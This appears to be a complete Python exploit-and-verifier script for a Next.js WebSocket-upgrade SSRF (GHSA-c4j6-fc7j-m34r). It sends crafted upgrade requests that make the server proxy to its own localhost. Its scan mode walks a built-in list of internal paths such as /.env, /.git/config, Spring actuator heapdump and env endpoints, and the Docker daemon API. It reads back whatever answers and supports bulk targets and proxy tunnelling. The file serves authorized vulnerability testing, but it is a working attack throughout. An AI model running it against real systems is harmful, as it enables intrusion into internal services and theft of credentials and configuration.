#!/usr/bin/env python3
"""
verify_ghsa_c4j6.py — In-band verifier for GHSA-c4j6-fc7j-m34r / CVE-2026-44578
(Next.js WebSocket-upgrade SSRF; affected: next >=13.4.13 <15.5.16, >=16.0.0 <16.2.5)

For authorized security testing only.

DETECTION MODEL (revised after empirical testing against next@15.5.15 vs 15.5.16):

The vulnerable code path in `resolveRoutes` treats any request URI containing
`//` (which is every absolute-form request-URI) as a "normalize repeated
slashes" case. It collapses the `//` to `/`, then the unpatched upgrade
handler in `router-server.ts` still proxies the result. The mangled target
(`http:/host:port/path` with one slash) loses its host, so Node's URL parser
gives `host=null`, and `http-proxy` falls back to `localhost:80` (HTTPS:443).
The practical SSRF surface is therefore ANY service listening on the Next.js
host's localhost:80 or localhost:443 — with an attacker-controlled path.

Because the connection never reaches an external host, an out-of-band canary
will not receive callbacks. Detection is instead done in-band by reading the
upgrade socket:

  - "Internal Server Error" in the response  -> VULNERABLE
        (Next's http-proxy error handler ran; only the pre-patch path
         enters that code branch.)
  - Response starts with "HTTP/1."           -> VULNERABLE + reachable
        (A service on the host's localhost actually answered the proxy.)
  - Empty response / clean close             -> LIKELY PATCHED / not Next /
                                                behind a reverse proxy that
                                                strips Upgrade
  - Anything else                            -> INCONCLUSIVE

Usage:
  python3 verify_ghsa_c4j6.py --target https://app1.example.com
  python3 verify_ghsa_c4j6.py --targets-file targets.txt --json
  cat targets.txt | python3 verify_ghsa_c4j6.py
"""

from __future__ import annotations

import argparse
import asyncio
import base64
import json
import re
import secrets
import ssl
import sys
from urllib.parse import urlsplit


DEFAULT_TIMEOUT = 5.0
DEFAULT_CONCURRENCY = 10
DEFAULT_PROBE_PATH = "/x"  # arbitrary; becomes the path on localhost:80 of the target

HTTP_STATUS_RE = re.compile(r"^HTTP/1\.\d (\d{3}) ")

# Common paths that often surface co-located services on localhost. The SSRF
# in this CVE is pinned to the target's localhost:80/443, so these are the
# kinds of paths that can reveal what (if anything) is listening there.
DEFAULT_SCAN_PATHS = [
    "/",
    "/index.html",
    # apache / nginx status modules
    "/server-status", "/server-info",
    "/nginx_status", "/stub_status",
    # health & status
    "/health", "/healthz", "/_health", "/status", "/_status", "/ping",
    "/ready", "/readyz", "/live", "/livez",
    # metrics
    "/metrics", "/prometheus", "/_metrics",
    # admin panels (common framework defaults)
    "/admin", "/admin/", "/administrator/",
    "/manager/html",     # tomcat
    "/console",          # weblogic / others
    "/wp-admin/", "/wp-login.php",
    # generic apis
    "/api", "/api/v1", "/api/v2",
    # spring boot actuator
    "/actuator", "/actuator/env", "/actuator/health",
    "/actuator/mappings", "/actuator/beans", "/actuator/configprops",
    "/actuator/heapdump", "/actuator/threaddump",
    # go pprof / expvar
    "/debug/vars", "/debug/pprof/", "/debug/pprof/heap",
    # docker daemon over http
    "/containers/json", "/version", "/info", "/images/json",
    # leaky config files often dropped at webroot
    "/.env", "/.git/config", "/.git/HEAD", "/config", "/config.json",
    # php classics
    "/phpinfo.php", "/info.php", "/phpmyadmin/",
    # elasticsearch
    "/_cat/indices", "/_cluster/health", "/_nodes",
    # jmx / jolokia
    "/jmx-console/", "/jolokia/list",
    # next.js itself (loopback when next is the localhost service)
    "/_next/static/",
]


def build_payload(absolute_uri: str, target_host_header: str) -> bytes:
    lines = [
        f"GET {absolute_uri} HTTP/1.1",
        f"Host: {target_host_header}",
        "Connection: Upgrade",
        "Upgrade: websocket",
        "Sec-WebSocket-Version: 13",
        "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==",
        "",
        "",
    ]
    return "\r\n".join(lines).encode("latin-1")


def parse_target(url: str) -> tuple[str, int, bool]:
    if "://" not in url:
        url = "http://" + url
    parts = urlsplit(url)
    host = parts.hostname
    if not host:
        raise ValueError(f"invalid target: {url}")
    is_tls = parts.scheme == "https"
    port = parts.port or (443 if is_tls else 80)
    return host, port, is_tls


def parse_proxy(url: str) -> tuple[str, int, str | None, str | None]:
    """Return (host, port, username, password) for an http(s):// CONNECT proxy."""
    if "://" not in url:
        url = "http://" + url
    p = urlsplit(url)
    if p.scheme not in ("http", "https"):
        raise ValueError(f"unsupported proxy scheme: {p.scheme}")
    if not p.hostname:
        raise ValueError(f"invalid proxy URL: {url}")
    port = p.port or (443 if p.scheme == "https" else 8080)
    return p.hostname, port, p.username, p.password


async def _open_via_proxy(
    target_host: str,
    target_port: int,
    ssl_ctx: ssl.SSLContext | None,
    proxy_info: tuple[str, int, str | None, str | None],
    timeout: float,
):
    """Open a (possibly TLS) connection through an HTTP CONNECT proxy."""
    p_host, p_port, p_user, p_pass = proxy_info
    reader, writer = await asyncio.wait_for(
        asyncio.open_connection(p_host, p_port), timeout=timeout
    )

    lines = [
        f"CONNECT {target_host}:{target_port} HTTP/1.1",
        f"Host: {target_host}:{target_port}",
    ]
    if p_user is not None:
        creds = f"{p_user}:{p_pass or ''}".encode("latin-1")
        token = base64.b64encode(creds).decode("ascii")
        lines.append(f"Proxy-Authorization: Basic {token}")
    lines.extend(["", ""])
    writer.write("\r\n".join(lines).encode("latin-1"))
    await writer.drain()

    status = await asyncio.wait_for(reader.readline(), timeout=timeout)
    if not status:
        writer.close()
        raise OSError("proxy closed before CONNECT response")
    parts = status.decode("latin-1", "replace").split(" ", 2)
    if len(parts) < 2 or not parts[1].startswith("2"):
        writer.close()
        raise OSError(f"CONNECT failed: {status.decode('latin-1','replace').strip()}")

    while True:
        line = await asyncio.wait_for(reader.readline(), timeout=timeout)
        if line in (b"\r\n", b""):
            break

    if ssl_ctx is not None:
        if not hasattr(writer, "start_tls"):
            raise RuntimeError(
                "TLS over CONNECT proxy requires Python 3.11+"
            )
        await writer.start_tls(ssl_ctx, server_hostname=target_host)

    return reader, writer


def classify(snippet: str) -> tuple[str, bool, dict]:
    """Map the raw bytes of the socket reply to (verdict, impact_confirmed, extras).

    impact_confirmed is True iff the response shows that the proxied upgrade
    actually reached a service on the target's localhost:80/443 and read
    something back — i.e. real data exfiltration through the SSRF gadget.
    """
    extras: dict = {}
    if not snippet:
        return "likely_patched", False, extras
    if snippet.startswith("HTTP/1."):
        m = HTTP_STATUS_RE.match(snippet)
        if m:
            extras["upstream_status"] = int(m.group(1))
        # parse a few common headers from the first chunk for operator triage
        for line in snippet.split("\r\n")[1:15]:
            low = line.lower()
            if low.startswith("server:"):
                extras["upstream_server"] = line.split(":", 1)[1].strip()
            elif low.startswith("content-type:"):
                extras["upstream_content_type"] = line.split(":", 1)[1].strip()
        return "vulnerable_proxy_succeeded", True, extras
    if "Internal Server Error" in snippet:
        return "vulnerable", False, extras
    return "inconclusive", False, extras


async def probe_one(
    target: str,
    probe_path: str,
    timeout: float,
    verify_tls: bool,
    proxy_info: tuple | None = None,
) -> dict:
    token = secrets.token_hex(8)
    try:
        host, port, is_tls = parse_target(target)
    except ValueError as e:
        return {"target": target, "probe_path": probe_path, "token": token,
                "status": "invalid", "verdict": "error",
                "impact_confirmed": False, "error": str(e)}

    host_header = host if port in (80, 443) else f"{host}:{port}"
    # Use an empty-authority absolute URI ("http:///<path>"). After Next's
    # normalizeRepeatedSlashes collapses the //, the parsed URL becomes
    # "http:/<path>"; http-proxy then dials localhost:80 with the request
    # path = "/<path>" verbatim — which is what we actually want to probe.
    # An earlier "http://canary.invalid/<path>" form caused every probe to
    # hit "/canary.invalid/<path>" on the target's localhost service,
    # producing only false-positive 404s.
    absolute_uri = "http:///" + probe_path.lstrip("/")
    payload = build_payload(absolute_uri, host_header)

    ssl_ctx: ssl.SSLContext | None = None
    if is_tls:
        ssl_ctx = ssl.create_default_context()
        if not verify_tls:
            ssl_ctx.check_hostname = False
            ssl_ctx.verify_mode = ssl.CERT_NONE

    try:
        if proxy_info is not None:
            reader, writer = await _open_via_proxy(
                host, port, ssl_ctx, proxy_info, timeout
            )
        elif ssl_ctx is not None:
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(host, port, ssl=ssl_ctx, server_hostname=host),
                timeout=timeout,
            )
        else:
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(host, port), timeout=timeout
            )
    except (asyncio.TimeoutError, OSError, ssl.SSLError, RuntimeError) as e:
        return {"target": target, "probe_path": probe_path, "token": token,
                "status": "connect_error", "verdict": "error",
                "impact_confirmed": False, "error": str(e)}

    try:
        writer.write(payload)
        await writer.drain()
        # read until close (or timeout) — caps so we don't grow unbounded on
        # a chatty upstream
        data = b""
        try:
            while len(data) < 8192:
                chunk = await asyncio.wait_for(reader.read(4096), timeout=timeout)
                if not chunk:
                    break
                data += chunk
        except asyncio.TimeoutError:
            pass
        snippet = data.decode("latin-1", "replace")
        verdict, impact_confirmed, extras = classify(snippet)
        result = {
            "target": target,
            "probe_path": probe_path,
            "token": token,
            "status": "sent",
            "verdict": verdict,
            "impact_confirmed": impact_confirmed,
            "response_snippet": snippet[:500].replace("\r", " ").replace("\n", " "),
        }
        result.update(extras)
        return result
    except OSError as e:
        return {"target": target, "probe_path": probe_path, "token": token,
                "status": "send_error", "verdict": "error",
                "impact_confirmed": False, "error": str(e)}
    finally:
        try:
            writer.close()
            await writer.wait_closed()
        except Exception:
            pass


async def run(targets, paths, concurrency, timeout, verify_tls, proxy_info=None):
    sem = asyncio.Semaphore(concurrency)

    async def bound(t, p):
        async with sem:
            return await probe_one(t, p, timeout, verify_tls, proxy_info)

    tasks = [bound(t, p) for t in targets for p in paths]
    return await asyncio.gather(*tasks)


def load_targets(args) -> list[str]:
    targets: list[str] = []
    if args.targets_file:
        with open(args.targets_file) as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith("#"):
                    targets.append(line)
    if args.target:
        targets.extend(args.target)
    if not targets and not sys.stdin.isatty():
        for line in sys.stdin:
            line = line.strip()
            if line and not line.startswith("#"):
                targets.append(line)
    seen = set()
    out = []
    for t in targets:
        if t not in seen:
            seen.add(t)
            out.append(t)
    return out


VERDICT_GLYPH = {
    "vulnerable": "VULN",
    "vulnerable_proxy_succeeded": "VULN+",
    "likely_patched": "OK?",
    "inconclusive": "????",
    "error": "ERR",
}


def main() -> int:
    p = argparse.ArgumentParser(
        description="In-band verifier for GHSA-c4j6-fc7j-m34r (Next.js WebSocket-upgrade SSRF)."
    )
    p.add_argument("--target", action="append", default=[],
                   help="A target (host:port or URL). Repeat for multiple.")
    p.add_argument("--targets-file",
                   help="File with one target per line (# comments allowed).")
    p.add_argument("--probe-path", default=DEFAULT_PROBE_PATH,
                   help="Path component used in the crafted request-URI. "
                        "Becomes the path on the target's localhost service. "
                        f"Default: {DEFAULT_PROBE_PATH}")
    p.add_argument("--scan", action="store_true",
                   help="After detection, probe a built-in list of common "
                        "paths (status pages, admin panels, actuator, debug "
                        "endpoints, etc.) to enumerate any service co-located "
                        "on the target's localhost:80/443.")
    p.add_argument("--scan-paths-file",
                   help="File with paths (one per line, '#' for comments) to "
                        "use instead of the built-in scan list. Implies --scan.")
    p.add_argument("--timeout", type=float, default=DEFAULT_TIMEOUT)
    p.add_argument("--concurrency", type=int, default=DEFAULT_CONCURRENCY)
    p.add_argument("--insecure", action="store_true",
                   help="Skip TLS certificate verification for https targets. "
                        "Required when --proxy MITMs TLS (e.g. Burp).")
    p.add_argument("--proxy",
                   help="HTTP CONNECT proxy to tunnel through, e.g. "
                        "http://127.0.0.1:8080 or http://user:pass@host:port "
                        "(Burp, mitmproxy, OWASP ZAP).")
    p.add_argument("--json", action="store_true",
                   help="Emit JSON Lines instead of human-readable output.")
    args = p.parse_args()

    targets = load_targets(args)
    if not targets:
        p.error("provide --target, --targets-file, or pipe targets on stdin")

    if args.scan_paths_file:
        with open(args.scan_paths_file) as f:
            paths = [l.strip() for l in f
                     if l.strip() and not l.strip().startswith("#")]
        scan_mode = True
    elif args.scan:
        paths = DEFAULT_SCAN_PATHS
        scan_mode = True
    else:
        paths = [args.probe_path]
        scan_mode = False

    proxy_info = None
    if args.proxy:
        try:
            proxy_info = parse_proxy(args.proxy)
        except ValueError as e:
            p.error(str(e))

    results = asyncio.run(
        run(targets, paths, args.concurrency, args.timeout,
            not args.insecure, proxy_info)
    )

    if args.json:
        for r in results:
            print(json.dumps(r))
        return 0

    if scan_mode:
        _print_scan(results)
    else:
        for r in results:
            _print_single(r)

    # final summary across all results
    counts: dict[str, int] = {}
    impacts = 0
    for r in results:
        counts[r["verdict"]] = counts.get(r["verdict"], 0) + 1
        if r.get("impact_confirmed"):
            impacts += 1
    print()
    print("overall:")
    for verdict, n in sorted(counts.items()):
        print(f"  {verdict}: {n}")
    print(f"  impact_confirmed: {impacts}")
    return 0


def _print_single(r: dict) -> None:
    tag = VERDICT_GLYPH.get(r["verdict"], r["verdict"])
    impact = "YES" if r.get("impact_confirmed") else " no"
    line = (
        f"[{tag:>5}] target={r['target']:<40}"
        f"  verdict={r['verdict']:<28}  impact={impact}"
    )
    if r.get("upstream_status"):
        line += f"  upstream={r['upstream_status']}"
    if r.get("upstream_server"):
        line += f" ({r['upstream_server']!r})"
    if "error" in r:
        line += f"  error={r['error']}"
    print(line)
    if r.get("impact_confirmed") and r.get("response_snippet"):
        print(f"        snippet: {r['response_snippet'][:200]!r}")
    elif r.get("response_snippet") and r["verdict"] == "vulnerable":
        print(f"        snippet: {r['response_snippet'][:80]!r}")


def _print_scan(results: list[dict]) -> None:
    by_target: dict[str, list[dict]] = {}
    for r in results:
        by_target.setdefault(r["target"], []).append(r)

    for target, rows in by_target.items():
        print(f"\n=== {target} ===")
        # detection summary: vulnerable if ANY row says so
        any_vuln = any(r["verdict"].startswith("vulnerable") for r in rows)
        any_impact = any(r.get("impact_confirmed") for r in rows)
        if not any_vuln:
            print("  (not vulnerable / no signal — skipping detail)")
            continue
        for r in rows:
            tag = VERDICT_GLYPH.get(r["verdict"], r["verdict"])
            impact = "YES" if r.get("impact_confirmed") else " - "
            path = r.get("probe_path", "?")
            line = f"  [{tag:>5}] {path:<30} impact={impact}"
            if r.get("upstream_status"):
                line += f"  status={r['upstream_status']}"
            if r.get("upstream_content_type"):
                line += f"  ct={r['upstream_content_type']!r}"
            if r.get("error"):
                line += f"  err={r['error']}"
            print(line)

        if any_impact:
            servers = {r.get("upstream_server")
                       for r in rows if r.get("upstream_server")}
            servers.discard(None)
            hits = [r for r in rows if r.get("impact_confirmed")]
            print(f"  -> {len(hits)}/{len(rows)} paths reached a service")
            if servers:
                print(f"  -> upstream server(s) seen: {', '.join(sorted(s for s in servers if s))}")
        else:
            print("  -> bug present but nothing answering on localhost:80/443")


if __name__ == "__main__":
    sys.exit(main())
